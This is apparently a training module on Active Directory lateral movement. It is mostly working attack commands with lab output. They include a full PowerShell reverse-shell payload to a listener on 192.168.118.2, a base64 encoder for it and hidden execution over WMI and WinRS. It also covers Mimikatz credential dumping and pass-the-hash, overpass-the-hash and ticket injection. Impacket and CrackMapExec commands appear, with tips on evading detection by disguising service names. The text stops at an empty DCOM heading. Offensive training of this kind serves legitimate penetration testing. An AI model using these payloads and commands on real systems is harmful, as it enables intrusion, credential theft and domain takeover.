# Lateral Movement in Active Directory

Lateral movement represents the critical phase where attackers leverage compromised credentials and authentication materials to expand their foothold across the network. This module focuses on practical techniques for moving between systems using password hashes, Kerberos tickets, and various remote execution methods to compromise high-value targets within Active Directory environments.

Building upon the credential harvesting and authentication attacks covered in previous modules, we explore how to weaponize NTLM hashes, Kerberos tickets, and valid accounts to gain unauthorized access to additional systems and escalate privileges toward domain compromise objectives.

## Table of Contents

### 1. [Understanding Lateral Movement in Active Directory](#understanding-lateral-movement-in-active-directory)
- **1.1 [Lateral Movement Fundamentals](#lateral-movement-fundamentals)**
- **1.2 [Authentication Material Reuse](#authentication-material-reuse)**
- **1.3 [Remote Execution Methods](#remote-execution-methods)**

### 2. [Active Directory Lateral Movement Techniques](#active-directory-lateral-movement-techniques)
- **2.1 [WMI and WinRM Lateral Movement](#wmi-and-winrm-lateral-movement)**
- **2.2 [PsExec-Based Lateral Movement](#psexec-based-lateral-movement)**
- **2.3 [Pass-the-Hash Techniques](#pass-the-hash-techniques)**
- **2.4 [Overpass-the-Hash (Pass-the-Key)](#overpass-the-hash-pass-the-key)**
- **2.5 [DCOM Lateral Movement](#dcom-lateral-movement)**

### 3. [Active Directory Persistence](#active-directory-persistence)
- **3.1 [Golden Tickets](#golden-tickets)**
- **3.2 [Shadow Copies](#shadow-copies)**
- **3.3 [Skeleton Keys](#skeleton-keys)**

---

## Understanding Lateral Movement in Active Directory

Lateral movement encompasses techniques for expanding access within target networks using compromised credentials, authentication materials, and valid accounts. These techniques enable attackers to move from initial footholds to high-value systems containing sensitive data or privileged user sessions.

**Learning Objectives:**
- Understand WMI, WinRS, and WinRM lateral movement techniques
- Abuse PsExec for lateral movement
- Learn about Pass-the-Hash and Overpass-the-Hash techniques
- Misuse DCOM to move laterally

### Lateral Movement Fundamentals

**MITRE ATT&CK Framework Context:**
Lateral movement represents a critical tactic consisting of various techniques aimed at gaining further access within target networks. These techniques leverage current valid accounts or reuse authentication materials such as password hashes, Kerberos tickets, and application access tokens obtained from previous attack stages.

**Strategic Objectives:**
- **Access Expansion:** Move from initial compromise to additional systems
- **Privilege Escalation:** Target systems with higher-privileged user sessions
- **Credential Harvesting:** Access systems containing additional authentication materials
- **Persistence Establishment:** Create multiple access points across the network

### Authentication Material Reuse

**Available Authentication Materials:**
- **NTLM Hashes:** Extracted from LSASS memory or SAM databases
- **Kerberos Tickets:** TGTs and service tickets cached in memory
- **Plaintext Passwords:** Recovered through various attack methods
- **Application Tokens:** Service-specific authentication tokens

**Reuse Challenges:**
- **Native Tool Limitations:** Microsoft tools don't support hash-based authentication
- **Protocol Requirements:** Kerberos and NTLM don't use plaintext passwords directly
- **Time Constraints:** Password cracking may be time-prohibitive
- **Detection Risks:** Multiple authentication attempts may trigger alerts

### Remote Execution Methods

**Primary Techniques:**
- **Windows Management Instrumentation (WMI):** Administrative framework for system management
- **Windows Remote Management (WinRM):** PowerShell remoting and command execution
- **PsExec:** Service-based remote command execution
- **Distributed Component Object Model (DCOM):** Object-oriented remote procedure calls

**Selection Criteria:**
- **Administrative Privileges:** Required privilege level on target systems
- **Network Accessibility:** Port availability and firewall configurations
- **Stealth Requirements:** Detection avoidance and operational security
- **Tool Availability:** Access to required attack tools and frameworks

---

## Active Directory Lateral Movement Techniques

This section explores practical implementation of lateral movement techniques, focusing on authentication material reuse and remote execution methods that enable network expansion and privilege escalation within Active Directory environments.

---

## WMI and WinRM Lateral Movement

Windows Management Instrumentation (WMI) and Windows Remote Management (WinRM) are object-oriented features that facilitate task automation and remote management. These legitimate administrative tools can be abused for lateral movement by creating processes on remote systems.

### Windows Management Instrumentation (WMI)

**WMI Architecture:**
- **Process Creation:** Uses Win32_Process class Create method
- **Communication:** Remote Procedure Calls (RPC) over port 135
- **Session Data:** Higher-range ports (19152-65535) for data transfer
- **Privileges:** Requires Administrator local group membership
- **Session Isolation:** Processes spawn in session 0 (system service context)

**WMI Attack Requirements:**
- Credentials of Administrators local group member (domain user acceptable)
- Network access to target system (RPC ports)
- No UAC remote restrictions for domain users

### Legacy WMI with wmic Utility

**Basic wmic Command Execution:**
```cmd
# Execute process on remote system
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

**Sample Output:**
```
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5772;
        ReturnValue = 0;
};
```

**Key Indicators:**
- **ProcessId:** PID of newly created process
- **ReturnValue 0:** Successful process creation
- **Session Context:** Process runs as specified user in session 0

### PowerShell WMI Implementation

**Step 1: Create PSCredential Object**
```powershell
# Store credentials securely
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
```

**Step 2: Configure CIM Session**
```powershell
# Create DCOM protocol session
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
$command = 'calc'
```

**Step 3: Execute WMI Command**
```powershell
# Invoke Win32_Process Create method
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
```

**Sample Execution Output:**
```
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

### Advanced WMI Payload Delivery

**PowerShell Reverse Shell Encoding:**
```python
# Python script to encode PowerShell payload
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```

**Encoded Payload Execution:**
```powershell
# Execute base64-encoded reverse shell via WMI
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...'

Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
```

**Reverse Shell Verification:**
```bash
# Netcat listener receives connection
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

PS C:\windows\system32> hostname
FILES04
PS C:\windows\system32> whoami
corp\jen
```

### Windows Remote Management (WinRM)

**WinRM Architecture:**
- **Protocol:** Microsoft implementation of WS-Management
- **Communication:** XML messages over HTTP/HTTPS
- **Ports:** TCP 5985 (HTTP), TCP 5986 (HTTPS)
- **Authentication:** Domain users in Administrators or Remote Management Users groups

### WinRS (Windows Remote Shell)

**Basic WinRS Command Execution:**
```cmd
# Execute commands on remote host
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

**Sample Output:**
```
FILES04
corp\jen
```

**WinRS Reverse Shell Delivery:**
```cmd
# Execute base64-encoded payload via WinRS
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD..."
```

### PowerShell Remoting (WinRM)

**Establish Remote PowerShell Session:**
```powershell
# Create credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create remote session
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```

**Session Output:**
```
 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
```

**Interactive Session Management:**
```powershell
# Enter interactive session
Enter-PSSession 1

# Commands execute on remote system
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

### WMI vs WinRM Technical Comparison

| Feature | WMI | WinRM |
|---------|-----|-------|
| **Protocol** | RPC over DCOM | HTTP/HTTPS |
| **Ports** | 135 + dynamic (19152-65535) | 5985 (HTTP), 5986 (HTTPS) |
| **Firewall Traversal** | Difficult (dynamic ports) | Easy (fixed ports) |
| **Session Context** | Session 0 (system) | User session |
| **Process Persistence** | No interactive session | Interactive PowerShell |
| **Authentication** | NTLM/Kerberos | NTLM/Kerberos |
| **Detection Signatures** | WMI provider host activity | WinRM service connections |

### Key Technical Differences

**WMI Process Creation:**
- **calc.exe → win32calc.exe:** wmic creates calc.exe which spawns win32calc.exe then exits
- **Session Isolation:** All processes run in session 0 as system services
- **No Interactivity:** Fire-and-forget command execution

**WinRM Session Management:**
- **Persistent Sessions:** Maintain state across multiple commands
- **User Context:** Commands execute in user's security context
- **Interactive Shell:** Full PowerShell remoting capabilities

### Operational Considerations

**WMI Advantages:**
- **Ubiquitous:** Available on all Windows systems
- **Stealth:** Legitimate administrative tool
- **No Service Dependencies:** Uses existing WMI infrastructure

**WinRM Advantages:**
- **Firewall Friendly:** Fixed port numbers
- **Session Persistence:** Maintain connection state
- **PowerShell Integration:** Native scripting capabilities
- **Encrypted Communication:** HTTPS support available

Both WMI and WinRM provide powerful lateral movement capabilities by leveraging legitimate Windows administrative frameworks, making detection challenging while providing reliable remote code execution mechanisms.

---

## PsExec-Based Lateral Movement

PsExec is a versatile tool from the SysInternals suite developed by Mark Russinovich, designed to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console. This legitimate administrative tool can be misused for lateral movement with proper understanding of its requirements and mechanisms.

### PsExec Requirements and Architecture

**Prerequisites for PsExec Lateral Movement:**
1. **Administrative Privileges:** User must be part of Administrators local group on target
2. **ADMIN$ Share Access:** Administrative share must be available
3. **File and Printer Sharing:** Must be enabled (default on Windows Server systems)

**PsExec Execution Process:**
1. **Service Binary Deployment:** Writes `psexesvc.exe` into `C:\Windows` directory
2. **Service Creation:** Creates and spawns a service on the remote host
3. **Process Execution:** Runs requested program/command as child process of `psexesvc.exe`
4. **Interactive Console:** Provides direct interactive access to remote system

### Traditional PsExec Implementation

**SysInternals PsExec64.exe Usage:**
```cmd
# Interactive session with domain credentials
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

**Command Parameters:**
- **-i:** Interactive session (allocates desktop for GUI applications)
- **\\FILES04:** Target hostname with UNC path format
- **-u corp\jen:** Domain\username format for authentication
- **-p Nexus123!:** Password for specified user account
- **cmd:** Command/process to execute remotely

**Sample PsExec Execution:**
```cmd
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```

**Key Success Indicators:**
- **Version Information:** PsExec banner confirms successful connection
- **Interactive Shell:** Direct command prompt on target system
- **Identity Verification:** `whoami` confirms execution context
- **System Verification:** `hostname` confirms target system access

### Advanced PsExec Options

**Additional Command-Line Parameters:**
```cmd
# Execute without interactive session
.\PsExec64.exe \\FILES04 -u corp\jen -p Nexus123! whoami

# Run as SYSTEM account
.\PsExec64.exe \\FILES04 -u corp\jen -p Nexus123! -s cmd

# Copy program to remote system and execute
.\PsExec64.exe \\FILES04 -u corp\jen -p Nexus123! -c program.exe

# Execute on multiple targets
.\PsExec64.exe \\FILES04,\\WEB04 -u corp\jen -p Nexus123! cmd

# Low priority execution
.\PsExec64.exe \\FILES04 -u corp\jen -p Nexus123! -l cmd
```

### Impacket PsExec Implementation

**Hash-Based Authentication:**
```bash
# PsExec with NTLM hash
impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.50.73

# PsExec with plaintext password
impacket-psexec Administrator:password123@192.168.50.73

# PsExec with Kerberos ticket
impacket-psexec -k -no-pass Administrator@target.domain.com
```

**Advanced Impacket Options:**
```bash
# Custom service name (evasion)
impacket-psexec -service-name "Windows Update Service" Administrator@192.168.50.73

# Upload and execute custom binary
impacket-psexec -file /path/to/binary.exe Administrator@192.168.50.73

# Use alternative authentication methods
impacket-psexec -aesKey <aes_key> Administrator@192.168.50.73
```

### PsExec vs Alternative Tools

**Impacket Tool Comparison:**
```bash
# SMBExec - Similar to PsExec but uses different service approach
impacket-smbexec -hashes :hash Administrator@target

# ATExec - Uses Task Scheduler instead of services
impacket-atexec -hashes :hash Administrator@target

# WMIExec - Uses WMI for execution
impacket-wmiexec -hashes :hash Administrator@target
```

### PsExec Detection and Forensics

**Detection Indicators:**
- **Service Creation Events:** Windows Event ID 7045 (psexesvc service)
- **Network Connections:** SMB traffic to ADMIN$ share
- **Process Creation:** PSEXESVC.exe process on target system
- **File System Activity:** psexesvc.exe in C:\Windows directory
- **Registry Modifications:** Service registration entries

**Forensic Artifacts:**
```cmd
# Service registry entries
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PSEXESVC

# Prefetch files (if enabled)
C:\Windows\Prefetch\PSEXESVC.EXE-*.pf

# Windows Event Logs
# Event ID 7045: Service installation
# Event ID 7036: Service start/stop
```

### PsExec Evasion Techniques

**Service Name Customization:**
```bash
# Custom service names to avoid detection
impacket-psexec -service-name "WindowsUpdateSvc" Administrator@target
impacket-psexec -service-name "TrustedInstaller" Administrator@target
```

**Alternative Execution Methods:**
```bash
# Use different Impacket tools
impacket-smbexec -hashes :hash Administrator@target  # No service creation
impacket-atexec -hashes :hash Administrator@target   # Uses Task Scheduler
```

### Operational Advantages of PsExec

**Direct Interactive Access:**
- **No Reverse Shell Required:** Direct console access without external listeners
- **Full Interactive Session:** Complete command-line interface with tab completion
- **GUI Application Support:** Can launch graphical applications with -i flag
- **Session Persistence:** Maintains connection until manually terminated

**Administrative Capabilities:**
- **SYSTEM Context:** Can execute processes as SYSTEM with -s flag
- **Service Management:** Full access to Windows services and system functions
- **File System Access:** Complete file system access with administrative privileges
- **Registry Manipulation:** Full registry access for system configuration

### PsExec Limitations and Considerations

**Network Requirements:**
- **SMB Protocol:** Requires SMB (port 445) access to target
- **Administrative Shares:** Depends on ADMIN$ share availability
- **Firewall Rules:** May be blocked by restrictive firewall policies

**Security Considerations:**
- **Credential Exposure:** Passwords visible in command line arguments
- **Service Artifacts:** Leaves forensic evidence through service creation
- **Detection Signatures:** Well-known tool with established detection patterns

### PowerShell-Based PsExec Alternative

**Custom Implementation Framework:**
```powershell
function Invoke-CustomPsExec {
    param(
        [string]$ComputerName,
        [string]$ServiceName = "CustomService",
        [string]$Command,
        [System.Management.Automation.PSCredential]$Credential
    )
    
    # Create custom service executable
    $serviceCode = @"
using System;
using System.Diagnostics;
using System.ServiceProcess;

public class CustomService : ServiceBase {
    protected override void OnStart(string[] args) {
        Process.Start("cmd.exe", "/c $Command");
    }
    
    public static void Main() {
        ServiceBase.Run(new CustomService());
    }
}
"@
    
    # Compile and deploy service
    # Implementation details for service creation and management
}
```

### Key Takeaways for PsExec Lateral Movement

**Operational Benefits:**
- **Legitimate Tool:** Part of official Microsoft SysInternals suite
- **Interactive Access:** Provides direct console access to remote systems
- **Administrative Context:** Executes with full administrative privileges
- **Cross-Platform:** Available through both Windows and Linux implementations

**Security Implications:**
- **High Privilege Requirement:** Requires administrative access on target
- **Forensic Footprint:** Creates detectable artifacts through service creation
- **Network Dependencies:** Relies on SMB protocol and administrative shares
- **Detection Risk:** Well-known tool with established security monitoring signatures

PsExec remains a powerful and versatile tool for lateral movement, providing direct interactive access to remote systems while leveraging legitimate Windows administrative functionality.

---

## Pass-the-Hash Techniques

Pass-the-Hash (PtH) is a lateral movement technique that allows attackers to authenticate to remote systems or services using a user's NTLM hash instead of the plaintext password. This technique works exclusively with NTLM authentication and is mapped in the MITRE Framework under the "Use Alternate Authentication Material" general technique.

### Pass-the-Hash Fundamentals

**Authentication Mechanism:**
- **NTLM Hash Usage:** Uses hash directly for authentication instead of plaintext password
- **SMB Protocol:** Connects to victims using Server Message Block (SMB) protocol
- **NTLM Authentication:** Performs authentication using the NTLM hash
- **Service Control Manager API:** Creates Windows services and communicates via Named Pipes

**MITRE ATT&CK Context:**
Pass-the-Hash represents a sub-technique under "Use Alternate Authentication Material," enabling lateral movement through credential reuse without requiring password cracking or plaintext credential access.

### Pass-the-Hash Prerequisites

**Network Requirements:**
1. **SMB Connection:** Firewall must allow SMB traffic (commonly port 445)
2. **File and Printer Sharing:** Windows feature must be enabled (common in enterprise environments)
3. **ADMIN$ Share Access:** Administrative share must be available

**Privilege Requirements:**
- **Local Administrative Permissions:** Valid credentials with local admin rights required
- **ADMIN$ Share Connection:** Attacker must present valid administrative credentials
- **Unauthorized Hash Access:** Vulnerability lies in unauthorized access to password hash

**Account Limitations (2014 Security Update):**
- **Domain Accounts:** Technique works for Active Directory domain accounts
- **Built-in Administrator:** Works for built-in local administrator account
- **Other Local Admins:** Cannot authenticate as other local admin accounts (security restriction)

### Impacket WMIExec Pass-the-Hash

**Basic WMIExec Implementation:**
```bash
# Pass-the-Hash using Impacket WMIExec
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

**Sample Execution Output:**
```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```

**Key Success Indicators:**
- **SMBv3.0 Dialect:** Confirms SMB protocol negotiation
- **Semi-Interactive Shell:** Direct command execution capability
- **Identity Verification:** `whoami` confirms administrative context
- **System Access:** `hostname` verifies target system compromise

### Pass-the-Hash Tool Ecosystem

**Third-Party Tools and Frameworks:**
- **PsExec (Metasploit):** Metasploit framework implementation
- **Passing-the-Hash Toolkit:** Specialized PtH tool collection
- **Impacket Suite:** Python-based implementation with multiple tools
- **CrackMapExec:** Network-wide credential testing and execution

**Common Implementation Pattern:**
1. **SMB Connection:** Establish SMB connection to target system
2. **NTLM Authentication:** Authenticate using hash instead of password
3. **Service Creation:** Create Windows service (e.g., cmd.exe, PowerShell)
4. **Named Pipe Communication:** Communicate with service via Named Pipes
5. **Code Execution:** Execute commands through established service

### Impacket Pass-the-Hash Tool Suite

**WMIExec - WMI-Based Execution:**
```bash
# WMI-based remote execution
impacket-wmiexec -hashes :ntlm_hash Administrator@target

# Domain account authentication
impacket-wmiexec -hashes :ntlm_hash domain/username@target
```

**PsExec - Service-Based Execution:**
```bash
# Service-based remote execution
impacket-psexec -hashes :ntlm_hash Administrator@target

# Custom service name
impacket-psexec -hashes :ntlm_hash -service-name CustomSvc Administrator@target
```

**SMBExec - SMB-Based Execution:**
```bash
# SMB-based execution (no service creation)
impacket-smbexec -hashes :ntlm_hash Administrator@target

# Alternative to PsExec with different artifacts
impacket-smbexec -hashes :ntlm_hash domain/username@target
```

### Advanced Pass-the-Hash Techniques

**Hash Format Requirements:**
```bash
# LM:NTLM format (LM hash can be empty)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@target

# NTLM-only format (preferred)
impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@target
```

**Network Pivoting Integration:**
```bash
# Pass-the-Hash through proxy/pivot
# Configure proxy settings for Impacket tools
export HTTP_PROXY=http://127.0.0.1:8080
impacket-wmiexec -hashes :hash Administrator@internal_target
```

### Pass-the-Hash vs SMB Share Access

**Code Execution Requirements:**
- **Windows Service Creation:** Required for remote code execution
- **Service Control Manager API:** Needed for service management
- **Named Pipes:** Communication channel for command execution

**SMB Share Access (No Code Execution):**
- **No Service Creation:** Direct SMB share access without service requirements
- **File System Access:** Read/write access to network shares
- **Credential Validation:** Verify hash validity without code execution

**Example SMB Share Access:**
```bash
# Access SMB shares without code execution
smbclient //target/share -U Administrator --pw-nt-hash
# Enter NTLM hash when prompted
```

### Pass-the-Hash Detection and Mitigation

**Detection Indicators:**
- **NTLM Authentication Events:** Windows Event ID 4624 (Type 3 logons)
- **SMB Connection Patterns:** Unusual SMB traffic to ADMIN$ shares
- **Service Creation Events:** Event ID 7045 for service-based tools
- **Process Creation:** Unusual processes spawned by services

**Security Mitigations:**
- **Local Account Token Filter:** Prevents local account network authentication
- **Protected Users Group:** Enhanced protection for high-privilege accounts
- **Credential Guard:** Hardware-based credential protection
- **Network Segmentation:** Limit lateral movement opportunities

### Operational Considerations

**Attack Advantages:**
- **No Password Cracking:** Direct hash usage without time-intensive cracking
- **NTLM Ubiquity:** NTLM authentication widely supported in enterprise environments
- **Tool Availability:** Multiple mature tools and frameworks available
- **Network Efficiency:** Direct authentication without additional infrastructure

**Limitations and Challenges:**
- **NTLM Dependency:** Only works with NTLM authentication (not Kerberos)
- **Administrative Requirements:** Requires local administrative privileges
- **Security Updates:** 2014 update restricts local account usage
- **Detection Risk:** Well-known technique with established detection methods

### Pass-the-Hash Commands Reference

**Impacket Tool Suite:**
```bash
# WMI execution
impacket-wmiexec -hashes :hash Administrator@target

# PsExec-style execution
impacket-psexec -hashes :hash Administrator@target

# SMB execution
impacket-smbexec -hashes :hash Administrator@target

# Scheduled task execution
impacket-atexec -hashes :hash Administrator@target

# Credential dumping
impacket-secretsdump -hashes :hash Administrator@target
```

**CrackMapExec Integration:**
```bash
# Single target authentication
crackmapexec smb target -u Administrator -H hash

# Network-wide testing
crackmapexec smb network/24 -u Administrator -H hash

# Command execution
crackmapexec smb target -u Administrator -H hash -x "command"

# Credential dumping
crackmapexec smb target -u Administrator -H hash --sam --lsa --ntds
```

### Key Insights for Pass-the-Hash

**Strategic Value:**
- **Rapid Lateral Movement:** Immediate access to additional systems
- **Credential Reuse:** Leverage previously compromised credentials
- **Administrative Context:** Gain administrative access on target systems
- **Network Expansion:** Access previously unreachable network segments

**Operational Security:**
- **Hash Protection:** Secure storage and handling of extracted hashes
- **Network Monitoring:** Awareness of SMB traffic patterns and detection
- **Tool Selection:** Choose appropriate tool based on target environment
- **Cleanup Procedures:** Remove artifacts and maintain operational security

Pass-the-Hash remains a fundamental lateral movement technique, providing direct administrative access to remote systems using NTLM hashes while leveraging legitimate Windows authentication mechanisms.

---

## Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash allows attackers to "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT), then use the TGT to obtain a Ticket Granting Service (TGS). This technique converts NTLM hash material into Kerberos tickets, avoiding NTLM authentication over the network.

### Overpass-the-Hash Fundamentals

**Technique Overview:**
- **Hash to Ticket Conversion:** Transform NTLM hash into Kerberos TGT
- **Kerberos Authentication:** Use generated TGT for service access
- **Network Stealth:** Avoid NTLM authentication over network
- **Protocol Bridging:** Leverage NTLM material for Kerberos authentication

**Attack Scenario Prerequisites:**
- Compromised workstation or server with cached user credentials
- NTLM hash extracted from LSASS memory
- Target services requiring Kerberos authentication

### Credential Caching Simulation

**Establish User Session Context:**
```cmd
# Right-click Notepad → "Show more options" → "Run as different user"
# Enter credentials: jen / Nexus123!
# This caches jen's credentials on the system
```

**Verify Cached Credentials:**
```mimikatz
# Launch Mimikatz with administrative privileges
privilege::debug

# Extract cached credentials
sekurlsa::logonpasswords
```

**Sample Credential Output:**
```
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session           : Interactive from 0
User Name         : jen
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/27/2023 7:43:20 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1124
        msv :
         [00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075
         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
```

### Mimikatz Overpass-the-Hash Implementation

**Create New PowerShell Process with Hash:**
```mimikatz
# Overpass-the-Hash attack using cached NTLM hash
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

**Sample Execution Output:**
```
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
```

**Key Process Details:**
- **New PowerShell Session:** Creates PowerShell process in jen's context
- **LUID Assignment:** Unique Logon Session ID for the new process
- **Kerberos Integration:** Enables Kerberos ticket generation
- **Identity Behavior:** `whoami` shows original user (jeff), not impersonated user (jen)

### Kerberos Ticket Generation Process

**Initial Ticket Status:**
```powershell
# Check for existing Kerberos tickets (should be empty)
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae
Cached Tickets: (0)
```

**Generate TGT via Network Authentication:**
```powershell
# Authenticate to network share to trigger TGT generation
PS C:\Windows\system32> net use \\files04
The command completed successfully.
```

**Verify Generated Kerberos Tickets:**
```powershell
PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

**Ticket Analysis:**
- **Ticket #0:** TGT (server: krbtgt/CORP.COM)
- **Ticket #1:** TGS for CIFS service (server: cifs/files04)
- **Encryption:** AES-256-CTS-HMAC-SHA1-96 (modern encryption)
- **Validity:** 10-hour default lifetime with renewal capability

### Leveraging Generated Kerberos Tickets

**PsExec with Kerberos Authentication:**
```powershell
# Navigate to SysInternals tools
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\

# Execute PsExec using Kerberos tickets (not password hash)
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

**Success Indicators:**
- **Kerberos Authentication:** PsExec uses generated TGT instead of password hash
- **Remote Access:** Successfully connects to FILES04 server
- **Identity Verification:** Commands execute as corp\jen
- **No Hash Transmission:** NTLM hash never transmitted over network

### Pass-the-Ticket Attack Extension

**Ticket Export and Injection:**
```mimikatz
# Export all tickets from memory
sekurlsa::tickets /export

# List exported ticket files
dir *.kirbi

# Inject specific ticket into current session
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

**Cross-User Ticket Abuse:**
```powershell
# Verify injected ticket
klist

# Access resources using injected ticket
ls \\web04\backup
```

### Overpass-the-Hash vs Pass-the-Hash Comparison

| Feature | Pass-the-Hash | Overpass-the-Hash |
|---------|---------------|-------------------|
| **Authentication Protocol** | NTLM | Kerberos |
| **Input Material** | NTLM Hash | NTLM Hash |
| **Output** | NTLM Authentication | Kerberos TGT |
| **Network Traffic** | NTLM Challenge-Response | Kerberos AS-REQ/AS-REP |
| **Service Compatibility** | NTLM Services | Kerberos Services |
| **Detection Difficulty** | Moderate | Higher |
| **Tool Compatibility** | Hash-aware tools required | Standard Kerberos tools |

### Key Advantages of Overpass-the-Hash

**Operational Benefits:**
- **Tool Compatibility:** Works with standard tools that don't accept password hashes
- **Protocol Preference:** Leverages Kerberos (preferred AD authentication)
- **Network Stealth:** Avoids NTLM authentication signatures
- **Ticket Reuse:** Generated tickets can be exported and reused

**Technical Advantages:**
- **No Hash Transmission:** NTLM hash never sent over network
- **Standard Authentication:** Uses legitimate Kerberos authentication flow
- **Session Integration:** Tickets integrate with existing user sessions
- **Cross-Platform:** Compatible with various authentication tools

Overpass-the-Hash demonstrates how NTLM hash material can be converted into Kerberos tickets, enabling stealthier lateral movement while maintaining compatibility with standard Windows authentication tools and avoiding direct hash transmission over the network.

---

## DCOM Lateral Movement

